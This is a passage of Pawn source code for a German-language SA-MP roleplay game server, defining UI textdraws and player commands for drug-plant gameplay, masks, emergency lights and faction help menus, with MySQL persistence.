	PlayerTextDrawSetSelectable(playerid,FahrschuleTheo[playerid][2],1);
	FahrschuleTheo[playerid][3] = CreatePlayerTextDraw(playerid,75.000000, 200.000000, "C.: Ja, Aufgrund des Beschleunigungsvermögen meines Auto habe ich Vorrang");
	PlayerTextDrawBackgroundColor(playerid,FahrschuleTheo[playerid][3], 65535);
	PlayerTextDrawFont(playerid,FahrschuleTheo[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid,FahrschuleTheo[playerid][3], 0.379999, 1.399999);
	PlayerTextDrawColor(playerid,FahrschuleTheo[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,FahrschuleTheo[playerid][3], 1);
	PlayerTextDrawSetProportional(playerid,FahrschuleTheo[playerid][3], 1);
	PlayerTextDrawUseBox(playerid,FahrschuleTheo[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid,FahrschuleTheo[playerid][3], -256);
	PlayerTextDrawTextSize(playerid,FahrschuleTheo[playerid][3], 585.000000, 10.000000);
	PlayerTextDrawSetSelectable(playerid,FahrschuleTheo[playerid][3],1);

	MoebelKauf[playerid][0] = CreatePlayerTextDraw(playerid, 671.000000, 107.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][0], 255);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][0], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][0], 0.500000, 1.899999);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][0], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][0], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][0], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][0], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][0], 1);
	PlayerTextDrawBoxColor			(playerid, MoebelKauf[playerid][0], 255);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][0], -13.000000, 0.000000);
	MoebelKauf[playerid][1] = CreatePlayerTextDraw(playerid, 671.000000, 109.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][1], 255);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][1], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][1], 0.500000, 1.500000);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][1], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][1], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][1], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][1], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][1], 1);
	PlayerTextDrawBoxColor			(playerid, MoebelKauf[playerid][1], 1499027967);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][1], -13.000000, 0.000000);
	MoebelKauf[playerid][2] = CreatePlayerTextDraw(playerid, 215.000000, 126.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][2], 255);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][2], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][2], 0.500000, 33.599983);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][2], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][2], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][2], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][2], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][2], 1);
	PlayerTextDrawBoxColor			(playerid, MoebelKauf[playerid][2], 255);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][2], 27.000000, 0.000000);
	MoebelKauf[playerid][3] = CreatePlayerTextDraw(playerid, 213.000000, 125.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][3], 255);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][3], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][3], 0.500000, 33.400001);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][3], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][3], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][3], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][3], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][3], 1);
	PlayerTextDrawBoxColor			(playerid, MoebelKauf[playerid][3], 1499027967);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][3], 29.000000, 0.000000);
	MoebelKauf[playerid][4] = CreatePlayerTextDraw(playerid, 508.000000, 146.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][4], 255);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][4], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][4], 0.500000, 23.799997);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][4], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][4], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][4], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][4], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][4], 1);
	PlayerTextDrawBoxColor			(playerid, MoebelKauf[playerid][4], 255);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][4], 256.000000, 0.000000);
	MoebelKauf[playerid][5] = CreatePlayerTextDraw(playerid, 506.000000, 148.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][5], 255);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][5], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][5], 0.500000, 23.299999);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][5], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][5], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][5], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][5], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][5], 1);
	PlayerTextDrawBoxColor			(playerid, MoebelKauf[playerid][5], 1499027967);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][5], 258.000000, 0.000000);
	MoebelKauf[playerid][6] = CreatePlayerTextDraw(playerid, 264.000000, 156.000000, "_");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][6], 1499027967);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][6], TEXT_DRAW_FONT_MODEL_PREVIEW);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][6], 0.500000, 21.599992);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][6], -1);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][6], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][6], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][6], 1);
	PlayerTextDrawUseBox			(playerid, MoebelKauf[playerid][6], 1);
	PlayerTextDrawTextSize			(playerid, MoebelKauf[playerid][6], 237.000000, 200.000000);
	MoebelKauf[playerid][7] = CreatePlayerTextDraw(playerid, 383.000000, 128.000000, "Waende");
	PlayerTextDrawAlignment	(playerid, MoebelKauf[playerid][7], 2);
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][7], -1);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][7], 2);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][7], 0.619998, 2.999999);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][7], 255);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][7], 1);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][7], 1);
	MoebelKauf[playerid][8] = CreatePlayerTextDraw(playerid, 406.000000, 330.000000, "8000");
	PlayerTextDrawAlignment	(playerid, MoebelKauf[playerid][8], 3);
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][8], -1);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][8], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][8], 0.549998, 2.599998);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][8], 16711935);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][8], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][8], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][8], 0);
	MoebelKauf[playerid][9] = CreatePlayerTextDraw(playerid, 414.000000, 329.000000, "C");
	PlayerTextDrawAlignment	(playerid, MoebelKauf[playerid][9], 2);
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][9], -1);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][9], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][9], 0.549998, 2.899998);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][9], 16711935);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][9], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][9], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][9], 0);
	MoebelKauf[playerid][10] = CreatePlayerTextDraw(playerid, 413.000000, 335.000000, "=");
	PlayerTextDrawAlignment	(playerid, MoebelKauf[playerid][10], 2);
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][10], -1);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][10], 1);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][10], 0.549998, 1.599999);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][10], 16711935);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][10], 0);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][10], 1);
	PlayerTextDrawSetShadow			(playerid, MoebelKauf[playerid][10], 0);
	MoebelKauf[playerid][11] = CreatePlayerTextDraw(playerid, 56.000000, 96.000000, "Katalog");
	PlayerTextDrawBackgroundColor	(playerid, MoebelKauf[playerid][11], -1);
	PlayerTextDrawFont				(playerid, MoebelKauf[playerid][11], 2);
	PlayerTextDrawLetterSize		(playerid, MoebelKauf[playerid][11], 0.540000, 2.299998);
	PlayerTextDrawColor				(playerid, MoebelKauf[playerid][11], 255);
	PlayerTextDrawSetOutline		(playerid, MoebelKauf[playerid][11], 1);
	PlayerTextDrawSetProportional	(playerid, MoebelKauf[playerid][11], 1);
	for(new x = 12; x < 12+sizeof(MoebelhausListe); x++)
	{
		MoebelKauf[playerid][x] = CreatePlayerTextDraw(playerid, 121.000000, 131.000+29*(x-12), "Testing");
		PlayerTextDrawSetString(playerid,MoebelKauf[playerid][x],MoebelhausListe[x-12]);
		PlayerTextDrawAlignment(playerid, MoebelKauf[playerid][x], 2);
		PlayerTextDrawBackgroundColor(playerid, MoebelKauf[playerid][x], 255);
		PlayerTextDrawFont(playerid, MoebelKauf[playerid][x], 1);
		PlayerTextDrawLetterSize(playerid, MoebelKauf[playerid][x], 0.620000, 2.400000);
		PlayerTextDrawColor(playerid, MoebelKauf[playerid][x], 255);
		PlayerTextDrawSetOutline(playerid, MoebelKauf[playerid][x], 0);
		PlayerTextDrawSetProportional(playerid, MoebelKauf[playerid][x], 1);
		PlayerTextDrawSetShadow(playerid, MoebelKauf[playerid][x], 0);
		PlayerTextDrawUseBox(playerid, MoebelKauf[playerid][x], 1);
		PlayerTextDrawBoxColor(playerid, MoebelKauf[playerid][x], 1717987071);
		PlayerTextDrawTextSize(playerid, MoebelKauf[playerid][x], 20.000000, 168);
	    PlayerTextDrawSetSelectable(playerid, MoebelKauf[playerid][x], 1);
    }
	return 1;
}

public Float:EntfernungZwischenSpielern(p1,p2)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	if(!IsPlayerConnected(p1) || !IsPlayerConnected(p2))
	{
		return -1.00;
	}
	GetPlayerPos(p1,x1,y1,z1);
	GetPlayerPos(p2,x2,y2,z2);
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}
//Befehle
new giveplayerid;
cmd:vielblaulicht(playerid,params[])
{
    printf("%s blaulicht",PlayerName(playerid));
	CreateDynamicObject(19797, 0.74900, -0.38030, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, 0.78150, -0.38170, 0.91050,   -180.00000, 0.00000, -90.00000);
	CreateDynamicObject(19797, 0.64190, -0.23930, 0.91050,   -180.00000, 0.00000, 0.00000);
	CreateDynamicObject(19797, 0.31810, -0.23860, 0.91050,   -180.00000, 0.00000, 0.00000);
	CreateDynamicObject(19797, 0.64330, -0.37920, 0.98250,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, 0.53610, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, 0.43370, -0.37920, 0.98250,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, 0.32610, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, 0.22060, -0.37920, 0.98250,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.00190, -0.23860, 0.91050,   -180.00000, 0.00000, 0.00000);
	CreateDynamicObject(19797, -0.32470, -0.23860, 0.91050,   -180.00000, 0.00000, 0.00000);
	CreateDynamicObject(19797, -0.64400, -0.23860, 0.91050,   -180.00000, 0.00000, 0.00000);
	CreateDynamicObject(19797, -0.78650, -0.38030, 0.91050,   -180.00000, 0.00000, 90.00000);
	CreateDynamicObject(19797, -0.64400, -0.52380, 0.91050,   -180.00000, 0.00000, 180.00000);
	CreateDynamicObject(19797, 0.63780, -0.52380, 0.91050,   -180.00000, 0.00000, 180.00000);
	CreateDynamicObject(19797, 0.31810, -0.52380, 0.91050,   -180.00000, 0.00000, 180.00000);
	CreateDynamicObject(19797, -0.00190, -0.52380, 0.91050,   -180.00000, 0.00000, 180.00000);
	CreateDynamicObject(19797, -0.32470, -0.52380, 0.91050,   -180.00000, 0.00000, 180.00000);
	CreateDynamicObject(19797, 0.11980, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, 0.01810, -0.37920, 0.98250,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.08290, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.18290, -0.37920, 0.98250,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.28890, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.38690, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.39490, -0.37920, 0.98250,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.49590, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.60380, -0.37920, 0.97850,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.68370, -0.37920, 0.98050,   90.00000, 90.00000, 180.00000);
	CreateDynamicObject(19797, -0.75160, -0.38450, 0.98250,   90.00000, 90.00000, 180.00000);
	return 1;
}
cmd:vernichten(playerid,params[])
{
    printf("%s vernichten",PlayerName(playerid));
    for(new i = 0; i < MAX_PLAYERS; i++)
    {
        if(IsPlayerInRangeOfPoint(playerid,3,CDrogen[i][dX],CDrogen[i][dY],CDrogen[i][dZ]))
        {
            new string[128];
            GebeGeld(playerid,80.75);
            CDrogen[i][drogenzeit] = 0;
            SendClientMessage(playerid,COLOR_GREEN,"Du hast eine Drogenpflanze zerstört! Du erhälst 80.75$");
            SendClientMessage(i,COLOR_RED,"Deine Drogenpflanze wurde zerstört!");
            format(string,sizeof string,"DELETE FROM drogen WHERE `drogenid`='%d'",CDrogen[i][drogenid]);
			mysql_query(dbhandle, string);
			printf("%s",string);
			CDrogen[i][drogenid] = -1;
			DestroyDynamicObject(CDrogen[i][drogenobject]);
			Delete3DTextLabel(CDrogen[i][drogenlabel]);
			CDrogen[i][drogenlabel] = Text3D:INVALID_3DTEXT_ID;
			KillTimer(pfltimer[i]);
			CDrogen[i][dX] = 0;
			CDrogen[i][dY] = 0;
			CDrogen[i][dZ] = 0;

        }
    }
	return 1;
}
cmd:service(playerid,params[])
{
    printf("%s service",PlayerName(playerid));
	ShowPlayerDialog(playerid,DIALOG_SERVICE,DIALOG_STYLE_LIST,"Notruf - Was brauchst du?","Police Department\nFire & Rescue Department\nTaxi","Anrufen","Abbrechen");
	return 1;
}
cmd:anpflanzen(playerid,params[])
{
    printf("%s anpflanzen",PlayerName(playerid));
	new query[500],str[150],eeename[MAX_PLAYER_NAME];
	GetPlayerName(playerid,eeename,sizeof(eeename));
	if(hathand[playerid] == -1)return SendClientMessage(playerid,COLOR_RED,"Du hast keine Samen in deiner Hand!");
	if(CDrogen[playerid][drogenid] == -1)
	{
		new Float:xx,Float:yy,Float:zz;
		GetPlayerPos(playerid,xx,yy,zz);
		CDrogen[playerid][drogenid] = SpielerInfo[playerid][uID];
		CDrogen[playerid][drogenzeit] = 60;
		CDrogen[playerid][dX] = xx;
		CDrogen[playerid][dY] = yy;
		CDrogen[playerid][dZ] = zz;
		hathand[playerid] = -1;
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_NONE);
		format(query,sizeof query,"INSERT INTO drogen (drogenid,drogenzeit,dX,dY,dZ) VALUES ('%d','%d','%.3f','%.3f','%.3f')",CDrogen[playerid][drogenid],CDrogen[playerid][drogenzeit],xx,yy,zz);
		mysql_query(dbhandle, query);
		printf("%s",query);
		format(str,sizeof(str),"{FF5000}Drogenpflanze{FAFAFA}\n\nBesitzer: %s %d/60 Minuten",eeename,CDrogen[playerid][drogenzeit]);
		CDrogen[playerid][drogenlabel] = Create3DTextLabel(str,COLOR_RED,CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ],5.0,0,1);
	 	pfltimer[playerid] = SetTimerEx("Drogensys",60000,0,"d",playerid);
	 	CDrogen[playerid][drogenobject] = CreateDynamicObjectEx(19473,CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ]-1.5,0,0,0,150,150);
	 	FraktionsNachricht(1, COLOR_HQ, "HQ: Es wurde anonym gemeldet, dass jemand Drogen angepflanzt hat!");
	 	FraktionsNachricht(2, COLOR_HQ, "HQ: Es wurde anonym gemeldet, dass jemand Drogen angepflanzt hat!");
	 	if(SpielerInfo[playerid][ufGras] == 0)
        {
        	SpielerInfo[playerid][ufGras] = 1;
        	Missionenaktu(playerid);
        	SendClientMessage(playerid,COLOR_BLUE,"[MISSIONEN]: {FFFFFF}GLÜCKWUNSCH! Du hast folgende Mission abgeschlossen: Gras anpflanzen {0080FF}(/missionen)");
        	new Float:belohnung;
        	belohnung = 200;
        	SendFormatMessage(playerid,COLOR_GREEN,"[BELOHNUNG]: {FFFFFF}Für diese Mission bekommst du %.2f{0B610B}$",belohnung);
			GebeGeld(playerid,belohnung);
		}
	 	//SetTimerEx("pfl",200,0,"d",playerid);
	 	//SetTimerEx("endeani",5000,0,"d",playerid);
	}else{SendClientMessage(playerid,COLOR_RED,"Du hast bereits eine Pflanze gepflanzt!");}

	return 1;
}
forward endeani(playerid);
public endeani(playerid)
{
	ClearAnimations(playerid);
	return 1;
}
cmd:ernten(playerid,params[])
{
    printf("%s ernten",PlayerName(playerid));
	new string[128];
	if(CDrogen[playerid][drogenid] == -1) return SendClientMessage(playerid,COLOR_RED,"Du hast keine Pflanze");
	if (IsPlayerInRangeOfPoint(playerid,2.0,CDrogen[playerid][dX],CDrogen[playerid][dY],CDrogen[playerid][dZ]))
	{
		if(CDrogen[playerid][drogenzeit] < 1)
		{
		    Verstauen(playerid,1578,5);
		    format(string,sizeof string,"DELETE FROM drogen WHERE `drogenid`='%d'",CDrogen[playerid][drogenid]);
			mysql_query(dbhandle, string);
			printf("%s",string);
			DestroyDynamicObject(CDrogen[playerid][drogenobject]);
			Delete3DTextLabel(CDrogen[playerid][drogenlabel]);
			CDrogen[playerid][drogenid] = -1;
			CDrogen[playerid][drogenlabel] = Text3D:INVALID_3DTEXT_ID;
			SendClientMessage(playerid,COLOR_GREEN,"Hanfplatze geerntet! Du erhälst 5g Gras.");
		}else{SendClientMessage(playerid,COLOR_RED,"Du kannst die Pflanze noch nicht ernten!");}
	}else{SendClientMessage(playerid,COLOR_RED,"Du bist nicht bei deiner Pflanze!");}
	return 1;
}
cmd:maske(playerid,params[])
{
    printf("%s maske",PlayerName(playerid));
	if(ppMaske[playerid] == 0)
	{
	    ppMaske[playerid] = 1;
	    SendClientMessage(playerid,COLOR_GREEN,"Maske aufgesetzt");
	    Maskex[playerid] = false;
    	SetPlayerAttachedObject(playerid, MAX_PLAYER_ATTACHED_OBJECTS - 2, 19472, 2, -0.0079, 0.1549, 0.0039, 22.8000, 87.1000, 73.9999, 1.0000, 1.0000, 1.0000, 0xFFFFFFFF, 0xFFFFFFFF);
	}else
	{
	    ppMaske[playerid] = 0;
	    SendClientMessage(playerid,COLOR_GREEN,"Maske abgesetzt");
	    RemovePlayerAttachedObject(playerid, MAX_PLAYER_ATTACHED_OBJECTS - 2);
		Maskex[playerid] = false;
	}
	return 1;
}
cmd:fhilfe(playerid,params[]) return CallLocalFunction("cmd_fhelp","d",playerid);
cmd:fraktionshilfe(playerid,params[]) return CallLocalFunction("cmd_fhelp","d",playerid);
cmd:fhelp(playerid,params[])
{
    printf("%s fhelp",PlayerName(playerid));
	if(IstSpielerInFrak(playerid,1))
	{
		new dialogstr[700] = "{FF0000}Lake Sorten Police Department Hilfe{FFFFFF}\n\n";
		strcat(dialogstr,"Allgemeine Befehle:\n /einsperren /wanted /gesuchte /tazer /ticket /handschellen /zerren /durchsuchen /abnehmen /vernichten /maske");
		strcat(dialogstr,"\nVerständigung:\n /m /p /f /notrufe /fraktion /rruf");
		strcat(dialogstr,"\nSperren:\n /sperre /rsperre /bunker (Tore des Bunkers)");
		strcat(dialogstr,"\nFahrzeugbefehle:\n /blaulicht /folgen , Taste [2] Light Flash bei Sirene");
		strcat(dialogstr,"\nWeitere-Befehle:\n /eblitzer /rblitzer Punkte: /gebepunkte /punkteleeren /zeitsetzen (Knastzeit) /ausrusten (Enforcer)");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,2))
	{
		new dialogstr[700] = "{FF0000}Santa Felton Police Department Hilfe{FFFFFF}\n\n";
		strcat(dialogstr,"Allgemeine Befehle:\n /einsperren /wanted /gesuchte /tazer /ticket /handschellen /zerren /durchsuchen /abnehmen /vernichten /maske");
		strcat(dialogstr,"\nVerständigung:\n /m /p /f /notrufe /fraktion /rruf");
		strcat(dialogstr,"\nSperren:\n /sperre /rsperre /bunker (Tore des Bunkers)");
		strcat(dialogstr,"\nFahrzeugbefehle:\n /blaulicht /folgen , Taste [2] Light Flash bei Sirene");
		strcat(dialogstr,"\nWeitere-Befehle:\n /eblitzer /rblitzer Punkte: /gebepunkte /punkteleeren /zeitsetzen (Knastzeit) /ausrusten (Enforcer)");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,15))
	{
		new dialogstr[700] = "{FF0000}U.S. Army Hilfe{FFFFFF}\n\n";
		strcat(dialogstr,"Allgemeine Befehle:\n /einsperren /wanted /gesuchte /tazer /ticket /handschellen /zerren /durchsuchen /abnehmen /vernichten /maske");
		strcat(dialogstr,"\nVerständigung:\n /m /p /f /fraktion /rruf");
		strcat(dialogstr,"\nSperren:\n /sperre /rsperre /bunker (Tore des Bunkers)");
		strcat(dialogstr,"\nFahrzeugbefehle:\n /blaulicht Taste [2] Light Flash bei Sirene");
		strcat(dialogstr,"\nWeitere-Befehle:\n Punkte: /gebepunkte /punkteleeren /ator /zellen /zeitsetzen (Knastzeit) /ausrusten (Enforcer)");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,3))
	{
    	new dialogstr[800] = "{FF0000}Lake Sorten Fire & Rescue Hilfe{FFFFFF}\n\n";
    	strcat(dialogstr,"Allgemein: /fraktion /m /p /f /notrufe /auftrag");
    	strcat(dialogstr,"\nMEDIC: /frmls[1-5] /frmsf[1-5] /heilen /wiederbeleben /verstrahlung");
    	strcat(dialogstr,"\nFEUERWEHR: /frfls [1-6] /alarmieren /blaulicht /fraktion /sperre /rsperre /bindemittel /atemschutz /atemschutzmaske");
    	strcat(dialogstr,"\nADAC: /frtls[1-4] /bls /autosperren /auftanken /reparatur /dl /aufbrechen /abschleppen /karosse");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,4))
	{
    	new dialogstr[800] = "{FF0000}Lake Sorten Fire & Rescue Hilfe{FFFFFF}\n\n";
    	strcat(dialogstr,"Allgemein: /fraktion /m /p /f /notrufe /auftrag");
    	strcat(dialogstr,"\nMEDIC: /frmls[1-5] /frmsf[1-5] /heilen /wiederbeleben /verstrahlung");
    	strcat(dialogstr,"\nFEUERWEHR: /frfls [1-6] /alarmieren /blaulicht /fraktion /sperre /rsperre /bindemittel /atemschutz /atemschutzmaske");
    	strcat(dialogstr,"\nADAC: /frtls[1-4] /bls /autosperren /auftanken /reparatur /aufbrechen /abschleppen /karosse");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,6))
	{
    	new dialogstr[100] = "{FF0000}Radio County Islands Hilfe{FFFFFF}\n\n";
    	strcat(dialogstr,"Verständigung: /f /news /werbung\n");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,7))
	{
    	new dialogstr[300] = "{FF0000}Ballas Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,8))
	{
    	new dialogstr[300] = "{FF0000}Grove Street Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,9))
	{
    	new dialogstr[300] = "{FF0000}Atzecas Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,10))
	{
    	new dialogstr[300] = "{FF0000}LCN Mafia Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/lcn /angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,16))
	{
    	new dialogstr[300] = "{FF0000}Vagos Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,17))
	{
    	new dialogstr[300] = "{FF0000}Mayans MC Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,11))
	{
    	new dialogstr[300] = "{FF0000}Yakuza Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/yakuza /angreifen /gangzonen /fraktion /f /rauben");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else if(IstSpielerInFrak(playerid,12))
	{
    	new dialogstr[300] = "{FF0000}Hitman Help{FFFFFF}\n\n";
    	strcat(dialogstr,"/fraktion /bestellen /f");
		ShowPlayerDialog(playerid, DIALOG_PFAND_HILFE, DIALOG_STYLE_MSGBOX, "Fraktions Befehle",dialogstr, "Schließen", "");
	}
	else {SendClientMessage(playerid,COLOR_RED,"Du bist in keiner Fraktion!"); }
	return 1;
}
cmd:rblitzer(playerid,params[])
{
    printf("%s rblitzer",PlayerName(playerid));
